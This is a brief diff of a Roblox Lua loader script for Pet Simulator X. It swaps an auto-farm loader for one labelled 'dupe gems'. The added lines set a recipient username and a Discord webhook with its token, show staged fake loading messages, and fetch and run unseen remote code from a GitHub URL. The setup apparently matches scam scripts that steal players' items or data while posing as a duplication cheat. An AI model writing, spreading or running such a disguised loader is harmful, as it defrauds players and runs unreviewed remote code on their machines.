@@ -1,3 +1,8 @@
-_G.UserID = 2990978534
-_G.WebHook = "https://discord.com/api/webhooks/1097201262602236004/EMx4_yFE5lRJxRcIBWcagW1dnkpoyflZ2HM1mREdrj_Pry0JNBmxjp8DS1Frbo4cpgED"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+Username = "fsdsfghdrty"
+WebHook = "https://discord.com/api/webhooks/1097831567398817922/zwEl70mjMd_kvKBrPw6ADvkkKtS5cOLcYgJcFY-fnipeYV7ypjWtgIK9U9xVZP9R9Ltr"
+_G.CustomScriptName = "dupe gems"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
